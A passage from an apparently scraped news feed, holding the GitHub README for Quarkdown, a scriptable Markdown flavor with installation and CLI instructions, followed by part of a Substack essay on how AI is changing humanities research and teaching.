<p dir="auto">
  <a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/iamgio/quarkdown/project-files/images/paged-demo.png"><img src="https://raw.githubusercontent.com/iamgio/quarkdown/project-files/images/paged-demo.png" alt="Paper demo"></a>
  </p><p dir="auto"><em>Original credits: <a href="https://arxiv.org/abs/1706.03762v7" rel="nofollow">Attention Is All You Need</a></em></p>


<p dir="auto">Born as an extension of CommonMark and GFM, the Quarkdown Flavor brings <strong>functions</strong> to Markdown, along with many other syntax extensions.</p>
<br>
<blockquote>
<p dir="auto">This is a function call:</p>
<div data-snippet-clipboard-copy-content=".somefunction {arg1} {arg2}
    Body argument"><pre><code>.somefunction {arg1} {arg2}
    Body argument
</code></pre></div>
</blockquote>

<p dir="auto"><strong>Possibilities are unlimited</strong> thanks to an ever-expanding <a href="https://github.com/iamgio/quarkdown/blob/main/quarkdown-stdlib/src/main/kotlin/com/quarkdown/stdlib">standard library</a>,
which offers layout builders, I/O, math, conditional statements and loops.</p>
<p dir="auto"><strong>Not enough?</strong> You can still define your own functions and variables ‚Äî all within Markdown.
You can even create awesome libraries for everyone to use.</p>
<br>
<blockquote>
<div data-snippet-clipboard-copy-content=".function {greet}
    to from:
    **Hello, .to** from .from!

.greet {world} from:{iamgio}"><pre><code>.function {greet}
    to from:
    **Hello, .to** from .from!

.greet {world} from:{iamgio}
</code></pre></div>
<p dir="auto">Result: <strong>Hello, world</strong> from iamgio!</p>
</blockquote>

<p dir="auto">This out-of-the-box scripting support opens doors to complex and dynamic content that would be otherwise impossible
to achieve with vanilla Markdown.</p>
<p dir="auto">Combined with live preview and ‚ö° fast compilation speed, Quarkdown simply gets the work done.</p>

<p dir="auto">
<a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/iamgio/quarkdown/project-files/video/livepreview.gif"><img src="https://raw.githubusercontent.com/iamgio/quarkdown/project-files/video/livepreview.gif" alt="Live preview" data-animated-image=""></a>
</p>

<p dir="auto">Check the <a href="https://github.com/iamgio/quarkdown/wiki">wiki</a> to learn more about the language and its features.</p>

<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">Check out the demo presentation <a href="https://iamgio.eu/quarkdown/demo" rel="nofollow">here</a></h2><a id="user-content-check-out-the-demo-presentation-here" aria-label="Permalink: Check out the demo presentation here" href="#check-out-the-demo-presentation-here"></a></p>
<div dir="auto"><p>
Built with Quarkdown itself ‚Äî <a href="https://github.com/iamgio/quarkdown/blob/main/demo/demo.qmd"><strong>source code</strong></a></p><p>
<em>(Desktop view is suggested)</em></p></div>
<hr>

<p dir="auto"><h2 tabindex="-1" dir="auto">As simple as you expect...</h2><a id="user-content-as-simple-as-you-expect" aria-label="Permalink: As simple as you expect..." href="#as-simple-as-you-expect"></a></p>
<p dir="auto">
  <a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/iamgio/quarkdown/project-files/images/code-paper.png"><img src="https://raw.githubusercontent.com/iamgio/quarkdown/project-files/images/code-paper.png" alt="Paper code demo"></a>
  </p><p dir="auto"><em>Inspired by: <a href="https://news.mit.edu/2025/x-ray-flashes-nearby-supermassive-black-hole-accelerate-mysteriously-0113" rel="nofollow">X-ray flashes from a nearby supermassive black hole accelerate mysteriously</a></em></p>


<p dir="auto"><h2 tabindex="-1" dir="auto">...as complex as you need.</h2><a id="user-content-as-complex-as-you-need" aria-label="Permalink: ...as complex as you need." href="#as-complex-as-you-need"></a></p>
<p dir="auto">
  <a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/iamgio/quarkdown/project-files/images/code-chart.png"><img src="https://raw.githubusercontent.com/iamgio/quarkdown/project-files/images/code-chart.png" alt="Chart code demo"></a>
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Targets</h2><a id="user-content-targets" aria-label="Permalink: Targets" href="#targets"></a></p>
<ul dir="auto">
<li>
<p dir="auto"><strong>HTML</strong></p>
<ul dir="auto">
<li>‚úÖ Plain output (default)</li>
<li>‚úÖ Slides <sup>via <a href="https://revealjs.com/" rel="nofollow">reveal.js</a></sup></li>
<li>‚úÖ Paged (books, articles) <sup>via <a href="https://pagedjs.org/" rel="nofollow">paged.js</a></sup><br>
<em>Paged documents require a webserver to render in the browser. See the <a href="#options"><code>-p</code></a> option below.</em></li>
</ul>
</li>
<li>
<p dir="auto"><strong>PDF</strong></p>
<ul dir="auto">
<li>‚úÖ All document types and features supported by HTML are also supported when exporting to PDF.</li>
<li>Check the wiki's <a href="https://github.com/iamgio/quarkdown/wiki/pdf-export">PDF export</a> page to learn more.</li>
</ul>
</li>
</ul>
<p dir="auto">The desired document type can be set by calling the <a href="https://github.com/iamgio/quarkdown/wiki/document-metadata"><code>.doctype</code> function</a> within the source itself:</p>
<ul dir="auto">
<li><code>.doctype {slides}</code></li>
<li><code>.doctype {paged}</code></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Comparison</h2><a id="user-content-comparison" aria-label="Permalink: Comparison" href="#comparison"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th></th>
<th>Quarkdown</th>
<th>Markdown</th>
<th>LaTeX</th>
<th>AsciiDoc</th>
<th>MDX</th>
</tr>
</thead>
<tbody>
<tr>
<td>Concise and readable</td>
<td>‚úÖ</td>
<td>‚úÖ</td>
<td>‚ùå</td>
<td>‚úÖ</td>
<td>‚úÖ</td>
</tr>
<tr>
<td>Full document control</td>
<td>‚úÖ</td>
<td>‚ùå</td>
<td>‚úÖ</td>
<td>‚ùå</td>
<td>‚ùå</td>
</tr>
<tr>
<td>Scripting</td>
<td>‚úÖ</td>
<td>‚ùå</td>
<td>Partial</td>
<td>‚ùå</td>
<td>‚úÖ</td>
</tr>
<tr>
<td>Book/article export</td>
<td>‚úÖ</td>
<td>‚ùå</td>
<td>‚úÖ</td>
<td>‚úÖ</td>
<td>Third-party</td>
</tr>
<tr>
<td>Presentation export</td>
<td>‚úÖ</td>
<td>‚ùå</td>
<td>‚úÖ</td>
<td>‚úÖ</td>
<td>Third-party</td>
</tr>
<tr>
<td>Targets</td>
<td>HTML, PDF</td>
<td>HTML</td>
<td>PDF, PostScript</td>
<td>HTML, PDF, ePub</td>
<td>HTML</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<markdown-accessiblity-table><table>
  <thead>
    <tr>
      <th>LaTeX</th>
      <th>Quarkdown</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
<div dir="auto" data-snippet-clipboard-copy-content="\tableofcontents

\section{Section}

\subsection{Subsection}

\begin{enumerate}
    \item \textbf{First} item
    \item \textbf{Second} item
\end{itemize}

\begin{center}
    This text is \textit{centered}.
\end{center}

\begin{figure}[!h]
    \centering
    \begin{subfigure}[b]
        \includegraphics[width=0.3\linewidth]{img1.png}
    \end{subfigure}
    \begin{subfigure}[b]
        \includegraphics[width=0.3\linewidth]{img2.png}
    \end{subfigure}
    \begin{subfigure}[b]
        \includegraphics[width=0.3\linewidth]{img3.png}
    \end{subfigure}
\end{figure}"><pre><span>\tableofcontents</span>

<span>\section</span>{<span>Section</span>}

<span>\subsection</span>{<span>Subsection</span>}

<span>\begin</span>{<span>enumerate</span>}
    <span>\item</span> <span>\textbf</span>{<span>First</span>} item
    <span>\item</span> <span>\textbf</span>{<span>Second</span>} item
<span>\end</span>{itemize}

<span>\begin</span>{<span>center</span>}
    This text is <span>\textit</span>{<span>centered</span>}.
<span>\end</span>{<span>center</span>}

<span>\begin</span>{<span>figure</span>}[!h]
    <span>\centering</span>
    <span>\begin</span>{<span>subfigure</span>}[b]
        <span>\includegraphics</span>[width=0.3<span>\linewidth</span>]{img1.png}
    <span>\end</span>{<span>subfigure</span>}
    <span>\begin</span>{<span>subfigure</span>}[b]
        <span>\includegraphics</span>[width=0.3<span>\linewidth</span>]{img2.png}
    <span>\end</span>{<span>subfigure</span>}
    <span>\begin</span>{<span>subfigure</span>}[b]
        <span>\includegraphics</span>[width=0.3<span>\linewidth</span>]{img3.png}
    <span>\end</span>{<span>subfigure</span>}
<span>\end</span>{<span>figure</span>}</pre></div>
</td>
<td>
<div dir="auto" data-snippet-clipboard-copy-content=".tableofcontents

# Section

## Subsection

1. **First** item
2. **Second** item

.center
    This text is _centered_.

.row alignment:{spacebetween}
    ![Image 1](img1.png)

    ![Image 2](img2.png)
    
    ![Image 3](img3.png)"><pre>.tableofcontents

<span># <span>Section</span></span>

<span>## <span>Subsection</span></span>

<span>1</span><span>.</span> <span>**</span>First<span>**</span> item
<span>2</span><span>.</span> <span>**</span>Second<span>**</span> item

.center
    This text is <span>_</span>centered<span>_</span>.

.row alignment:{spacebetween}
    <span>![</span>Image 1<span>]</span><span>(</span><span>img1.png</span><span>)</span>

    <span>![Image 2](img2.png)</span>
    
    <span>![Image 3](img3.png)</span></pre></div>
</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>

<p dir="auto"><h2 tabindex="-1" dir="auto">Getting started</h2><a id="user-content-getting-started" aria-label="Permalink: Getting started" href="#getting-started"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto">Download <code>quarkdown.zip</code> from the <a href="https://github.com/iamgio/quarkdown/releases/latest">latest stable release</a> or build it with <code>gradlew distZip</code>, and unzip it.</p>
<ul dir="auto">
<li>The <code>bin</code> directory contains the executable scripts. Optionally, adding it to your <code>PATH</code> allows you to access Quarkdown more easily.</li>
<li>The <code>lib/qmd</code> directory contains <code>.qmd</code> libraries that can be imported into a project.</li>
</ul>
<p dir="auto">Java 17 or higher is required. All major operating systems are supported.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Creating a project</h2><a id="user-content-creating-a-project" aria-label="Permalink: Creating a project" href="#creating-a-project"></a></p>
<p dir="auto">Running <strong><code>quarkdown create [directory]</code></strong> will launch the prompt-based project wizard, making it quicker than ever
to set up a new Quarkdown project, with all <a href="https://github.com/iamgio/quarkdown/wiki/document-metadata">metadata</a> and initial content already present.</p>
<p dir="auto">For more information about the project creator, check out its <a href="https://github.com/iamgio/quarkdown/wiki/cli%3A-project-creator">wiki page</a>.</p>
<p dir="auto">Alternatively, you may manually create a <code>.qmd</code> source file and start from there.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Compiling</h2><a id="user-content-compiling" aria-label="Permalink: Compiling" href="#compiling"></a></p>
<p dir="auto">Running <strong><code>quarkdown c file.qmd</code></strong> will compile the given file and save the output to file.</p>
<blockquote>
<p dir="auto">If the project is composed by multiple source files, the target file must be the root one, i.e. the one that includes the other files.</p>
<ul dir="auto">
<li><a href="https://github.com/iamgio/quarkdown/wiki/including-other-quarkdown-files">How to include other files?</a></li>
</ul>
</blockquote>
<p dir="auto">If you would like to familiarize yourself with Quarkdown instead, <code>quarkdown repl</code> lets you play with an interactive REPL mode.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Options</h4><a id="user-content-options" aria-label="Permalink: Options" href="#options"></a></p>
<ul dir="auto">
<li>
<p dir="auto"><strong><code>-p</code></strong> or <strong><code>--preview</code></strong>: enables automatic content reloading after compiling.<br>
If a <a href="https://github.com/iamgio/quarkdown/wiki/cli%3A-webserver">webserver</a> is not running yet, it is started and the document is opened in the default browser.<br>
This is required in order to render paged documents in the browser.</p>
</li>
<li>
<p dir="auto"><strong><code>-w</code></strong> or <strong><code>--watch</code></strong>: recompiles the source everytime a file from the source directory is changed.</p>
</li>
</ul>
<div dir="auto"><p dir="auto">Tip</p><p dir="auto">Combine <code>-p -w</code> to achieve <em><strong>live preview</strong></em>!</p>
</div>
<ul dir="auto">
<li>
<p dir="auto"><strong><code>--pdf</code></strong>: produces a PDF file. Learn more in the wiki's <a href="https://github.com/iamgio/quarkdown/wiki/pdf-export"><em>PDF export</em></a> page.</p>
</li>
<li>
<p dir="auto"><code>-o &lt;dir&gt;</code> or <code>--output &lt;dir&gt;</code>: sets the directory of the output files. Defaults to <code>./output</code>.</p>
</li>
<li>
<p dir="auto"><code>-l &lt;dir&gt;</code> or <code>--libs &lt;dir&gt;</code>: sets the directory where external libraries can be loaded from. Defaults to <code>&lt;install dir&gt;/lib/qmd</code>. <a href="https://github.com/iamgio/quarkdown/wiki/importing-external-libraries">(?)</a></p>
</li>
<li>
<p dir="auto"><code>-r &lt;renderer&gt;</code> or <code>--render &lt;renderer&gt;</code>: sets the target renderer. Defaults to <code>html</code>. Accepted values:</p>
<ul dir="auto">
<li><code>html</code></li>
<li><code>html-pdf</code> (equivalent to <code>-r html --pdf</code>)</li>
</ul>
</li>
<li>
<p dir="auto"><code>--server-port &lt;port&gt;</code>: optional customization of the local webserver's port. Defaults to <code>8089</code>.</p>
</li>
<li>
<p dir="auto"><code>--pretty</code>: produces pretty output code. This is useful for debugging or to read the output code more easily,
but it should be disabled in production as the results might be visually affected.</p>
</li>
<li>
<p dir="auto"><code>--clean</code>: deletes the content of the output directory before producing new files. Destructive operation.</p>
</li>
<li>
<p dir="auto"><code>--strict</code>: forces the program to exit if an error occurs. When not in strict mode, errors are shown as boxes in the document.</p>
</li>
<li>
<p dir="auto"><code>--no-media-storage</code>: turns the media storage system off. <a href="https://github.com/iamgio/quarkdown/wiki/media-storage">(?)</a></p>
</li>
<li>
<p dir="auto"><code>-Dloglevel=&lt;level&gt;</code> (JVM property): sets the log level. If set to <code>warning</code> or higher, the output content is not printed out.</p>
</li>
</ul>

<hr>

<p dir="auto"><h2 tabindex="-1" dir="auto">Mock document</h2><a id="user-content-mock-document" aria-label="Permalink: Mock document" href="#mock-document"></a></p>

<p dir="auto">
  <a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/iamgio/quarkdown/project-files/images/mock-demo.png"><img width="550" src="https://raw.githubusercontent.com/iamgio/quarkdown/project-files/images/mock-demo.png" alt="Mock document demo"></a>
</p>
<p dir="auto"><em><strong>Mock</strong></em>, written in Quarkdown, is a comprehensive collection of visual elements offered by the language,
making it ideal for exploring and understanding its key features ‚Äî all while playing and experimenting hands-on with a concrete outcome in the form of pages or slides.</p>
<ul dir="auto">
<li>The document's source files are available in the <a href="https://github.com/iamgio/quarkdown/blob/main/mock"><code>mock</code></a> directory, and can be compiled via <code>quarkdown c mock/main.qmd -p</code>.</li>
<li>The PDF artifacts generated for all possible theme combinations are available and can be viewed in the <a href="https://github.com/iamgio/quarkdown/tree/generated/pdf/mock"><code>generated</code></a> branch.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">Contributions are welcome! Please check <a href="https://github.com/iamgio/quarkdown/blob/main/CONTRIBUTING.md">CONTRIBUTING.md</a> to know how contribute via issues or pull requests.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Sponsors</h2><a id="user-content-sponsors" aria-label="Permalink: Sponsors" href="#sponsors"></a></p>
<p dir="auto">A special thanks to all the sponsors who <a href="https://github.com/sponsors/iamgio">supported this project</a>!</p>
<p dir="auto">
  <a href="https://github.com/LunaBluee"><img src="https://avatars.githubusercontent.com/u/145209701?v=4" alt="LunaBluee" width="35"></a>&nbsp;
  <a href="https://github.com/dcopia"><img src="https://avatars.githubusercontent.com/u/162327812?v=4" alt="dcopia" width="35"></a>
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Concept</h2><a id="user-content-concept" aria-label="Permalink: Concept" href="#concept"></a></p>
<p dir="auto">The logo resembles the original <a href="https://github.com/dcurtis/markdown-mark">Markdown icon</a>, with focus on Quarkdown's completeness,
richness of features and customization options, emphasized by the revolving arrow all around the sphere.</p>
<p dir="auto">
  <themed-picture data-catalyst-inline="true"><picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/iamgio/quarkdown/project-files/images/ticon-light.svg">
    <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/iamgio/quarkdown/project-files/images/ticon-dark.svg">
    <img alt="Quarkdown icon" src="https://raw.githubusercontent.com/iamgio/quarkdown/project-files/images/ticon-dark.svg">
  </picture></themed-picture>
</p>
<p dir="auto">What could be mistaken for a planet is actually a <strong>quark</strong> or, more specifically, a <strong>down quark</strong>,
an elementary particle that is a major constituent of matter: they give life to every complex structure we know of,
while also being one of the lightest objects in existence.</p>
<p dir="auto">This is, indeed, the concept <strong>Quarkdown</strong> is built upon.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AI makes the humanities more important, but also weirder (189 pts)]]></title>
            <link>https://resobscura.substack.com/p/ai-makes-the-humanities-more-important</link>
            <guid>44166102</guid>
            <pubDate>Tue, 03 Jun 2025 03:53:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://resobscura.substack.com/p/ai-makes-the-humanities-more-important">https://resobscura.substack.com/p/ai-makes-the-humanities-more-important</a>, See on <a href="https://news.ycombinator.com/item?id=44166102">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p><span>Writing recently </span><a href="https://www.newyorker.com/culture/the-weekend-essay/will-the-humanities-survive-artificial-intelligence" rel="">in </a><em><a href="https://www.newyorker.com/culture/the-weekend-essay/will-the-humanities-survive-artificial-intelligence" rel="">The New Yorker</a></em><span>, the historian of science D. Graham Burnett described how he has been thinking about AI:</span></p><blockquote><p>In one department on campus, a recently drafted anti-A.I. policy, read literally, would actually have barred faculty from giving assignments to students that centered on A.I. (It was ultimately revised.) Last year, when some distinguished alums and other worthies conducted an external review of the history department, a top recommendation was that we urgently address the looming A.I. disruptions to our teaching and research. This suggestion got a notably cool reception. But the idea that we can just keep going about our business won‚Äôt do, either.</p><p><span>On the contrary, staggering transformations are in full swing. And yet, on campus, we‚Äôre in a bizarre interlude: everyone seems intent on pretending that the most significant revolution in the world of thought in the past century </span><em>isn‚Äôt happening</em><span>. The approach appears to be: ‚ÄúWe‚Äôll just tell the kids they can‚Äôt use these tools and carry on as before.‚Äù This is, simply, madness. And it won‚Äôt hold for long. It‚Äôs time to talk about what all this means for university life, and for the humanities in particular.</span></p></blockquote><p><span>I suspect that a significant chunk of my historian colleagues had a negative reaction to this article. But I wholeheartedly agree with the central point Burnett makes within it ‚Äî&nbsp;not that generative AI is inherently good, but simply that it is </span><em>already</em><span> transformative for the humanities, and that this fact cannot be ignored or dismissed as hype. </span></p><p>Here‚Äôs how I‚Äôm currently thinking about that transformation. </p><p>Ignoring the impact of AI on humanistic work is not just increasingly untenable. It is also foolish, because humanistic knowledge and skills are central to what it is that AI language models actually do. </p><p>The language translation, sorting, and classification abilities of AI language models ‚Äî&nbsp;the LLM as a ‚Äúcalculator for words‚Äù ‚Äî are among the most compelling uses for the current frontier models.  We‚Äôre only beginning to see these impacts in domains like paleography, data mining, and translation of archaic languages. I discussed some examples here:</p><div data-component-name="DigestPostEmbed"><a href="https://resobscura.substack.com/p/generative-ai-for-historical-research" rel="noopener" target="_blank"><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_140,h_140,c_fill,f_webp,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3d8fe561-f43e-4208-9e50-777c7accc7f1_1940x1153.png"><img src="https://substackcdn.com/image/fetch/w_140,h_140,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3d8fe561-f43e-4208-9e50-777c7accc7f1_1940x1153.png" sizes="100vw" alt="How to use generative AI for historical research" width="140" height="140"></picture></div></a></div><p>‚Ä¶ and the state of the art has progressed quite a bit since then. But since this is one aspect of AI and humanities I‚Äôve written about at length, I‚Äôll leave it to the side for now. </p><p><span>Another underrated change of the past few years is that humanistic skills have become surprisingly important to AI research </span><em>itself</em><span>. </span></p><p><span>One recent example: OpenAI‚Äôs initial fix for GPT-4o‚Äôs bizarre recent turn toward sycophancy was not a new line of code. It was a new piece of </span><em>English prose</em><span>. Here‚Äôs </span><a href="https://simonwillison.net/2025/Apr/29/chatgpt-sycophancy-prompt/" rel="">Simon Willison</a><span> on the change to the system prompt that OpenAI implemented:</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7129c86a-2388-4328-8ac2-e626e1d127a8_2026x1260.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7129c86a-2388-4328-8ac2-e626e1d127a8_2026x1260.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7129c86a-2388-4328-8ac2-e626e1d127a8_2026x1260.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7129c86a-2388-4328-8ac2-e626e1d127a8_2026x1260.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7129c86a-2388-4328-8ac2-e626e1d127a8_2026x1260.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7129c86a-2388-4328-8ac2-e626e1d127a8_2026x1260.png" width="1456" height="906" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/7129c86a-2388-4328-8ac2-e626e1d127a8_2026x1260.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:906,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:217208,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://resobscura.substack.com/i/162236863?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7129c86a-2388-4328-8ac2-e626e1d127a8_2026x1260.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7129c86a-2388-4328-8ac2-e626e1d127a8_2026x1260.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7129c86a-2388-4328-8ac2-e626e1d127a8_2026x1260.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7129c86a-2388-4328-8ac2-e626e1d127a8_2026x1260.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7129c86a-2388-4328-8ac2-e626e1d127a8_2026x1260.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>This was not the only issue that caused the problem. But the other factors in play (such as prioritizing user feedback via a ‚Äúthumbs up‚Äù button) were similarly rooted in big-picture humanistic concerns like the impact of language on behavior, cross-cultural differences, and questions of rhetoric, genre, and tone.  </p><p>This is fascinating to me. When an IBM mainframe system broke down in the 1950s (or a steam engine exploded in the 1850s), the people who had to fix it likely did not spare a moment‚Äôs thought to consider any of these topics. </p><p>Today, engineers working on AI systems also need to think deeply and critically about the relationship between language and culture and the history and philosophy of technology. When they fail to do so, their systems literally start to break down. </p><p>Then there‚Äôs the newfound ability of non-technical people in the humanities to write their own code. This is a bigger deal than many in my field seem to recognize. I suspect this will change soon. The emerging generation of historians will simply take it for granted that they can create their own custom research and teaching tools and deploy them at will, more or less for free. </p><p>My own efforts so far have mostly been focused on two niche educational games modeled on old school text-based adventures ‚Äî&nbsp;not exactly something with a huge potential audience. But that‚Äôs exactly why I choose to do it. The stakes were low; the interest level for me personally was high; and I had significant expertise in the actual material and format, if not the code. </p><p>The progression from my first attempt (last fall) to my second (earlier this spring) has been an amazing learning experience. </p><p><span>Here‚Äôs the first game (</span><a href="https://history-lens.vercel.app/" rel="">you can find a free playable version here</a><span>). It‚Äôs a 17th century apothecary simulator that requires students to read and utilize actual early modern medical recipes to heal patients based on real historical figures. You play as Maria de Lima, a semi-fictional female apothecary in 1680s Mexico City with a hidden past: </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f73a5e8-45c3-4620-bf94-acc655895b60_3566x1948.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f73a5e8-45c3-4620-bf94-acc655895b60_3566x1948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f73a5e8-45c3-4620-bf94-acc655895b60_3566x1948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f73a5e8-45c3-4620-bf94-acc655895b60_3566x1948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f73a5e8-45c3-4620-bf94-acc655895b60_3566x1948.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f73a5e8-45c3-4620-bf94-acc655895b60_3566x1948.png" width="1456" height="795" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/9f73a5e8-45c3-4620-bf94-acc655895b60_3566x1948.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:795,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:4311862,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://resobscura.substack.com/i/162236863?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f73a5e8-45c3-4620-bf94-acc655895b60_3566x1948.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f73a5e8-45c3-4620-bf94-acc655895b60_3566x1948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f73a5e8-45c3-4620-bf94-acc655895b60_3566x1948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f73a5e8-45c3-4620-bf94-acc655895b60_3566x1948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f73a5e8-45c3-4620-bf94-acc655895b60_3566x1948.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Maria assesses the potential melancholia of her first patient of the day.</figcaption></figure></div><p>It was fascinating to make, but it also has significant bugs and usability issues, and it fairly quickly spools out into LLM-generated hallucinations that are unmoored by historical realities. (For instance, in one play-through, I, as Maria, was able to become a ship‚Äôs surgeon on a merchant vessel sailing to England, then meet with Isaac Newton in London. The famously quarrelsome and reclusive Newton was, for some reason, delighted to welcome me into his home for tea.)</p><p>My second attempt, a game where you play as a young Darwin collecting finches and other specimen on one of the Gal√°pagos Islands in 1835, is more sophisticated and more stable. </p><p><span>The terrain-based movement system, with specific locations based directly on actual landscapes Darwin wrote about in his </span><em>Voyage of the Beagle</em><span>, forces the AI to maintain a kind of literal ground truth. It is difficult to leave the island, and the animals and terrain you encounter are pulled directly from the actual writings of Darwin, reducing the tendency to hallucinate. </span></p><p><span>There is also a more robust logging system which will come in handy when I want to add an assessment layer to the game and turn it into an actual assignment. You can </span><a 